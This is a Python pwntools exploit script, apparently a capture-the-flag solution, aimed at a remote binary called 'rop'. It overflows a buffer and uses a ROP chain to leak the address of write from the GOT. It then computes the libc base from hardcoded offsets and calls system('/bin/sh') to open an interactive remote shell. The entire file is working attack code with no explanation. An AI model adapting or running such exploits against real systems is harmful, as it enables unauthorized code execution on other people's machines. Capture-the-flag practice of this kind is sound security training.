#!usr/bin/python2
from pwn import *
# p = process('./rop')
# context.log_level = "debug"
p = remote('noob.bckdr.in', 13371)
b = ELF('./rop')

# gdb.attach(p)

pppr = 0x0804850d

plt_write = p32(b.plt['write'])
got_write = p32(b.got['write'])
read_plt = p32(b.plt['read'])
main = p32(b.symbols['main'])
bss  = b.bss()


write_offset_libc = "0xe6d80"
system_offset_libc = "0x3d200"
binsh_offset_libc = "0x17e0cf"

def leak(address):
    payload  = ""
    payload += "A"*13
    payload += plt_write
    payload += p32(pppr)
    payload += p32(0x1)
    payload += address
    payload += p32(0x4)
    payload += main

    out = p.send(payload)
    data = p.recv(4)
    data = u32(data)
    return hex(data)


# l = DynELF(leak,elf=ELF('./level4'))

write_addr = leak(got_write)

# system_addr = l.lookup('system','libc')
log.success('leak write address: ' + write_addr)

libc_base = int(write_addr,16) - int(write_offset_libc,16)

log.info("Libc base : " + hex(libc_base))

system_libc = libc_base + int(system_offset_libc,16)

log.info("system addr: " + hex(system_libc))

binsh_addr = libc_base + int(binsh_offset_libc,16)

# log.info("Read  @libc: " + hex(read_libc))

payload = "A"*13
payload += p32(system_libc)
payload += "AAAA"
payload += p32(binsh_addr)

p.sendline(payload)
p.interactive()
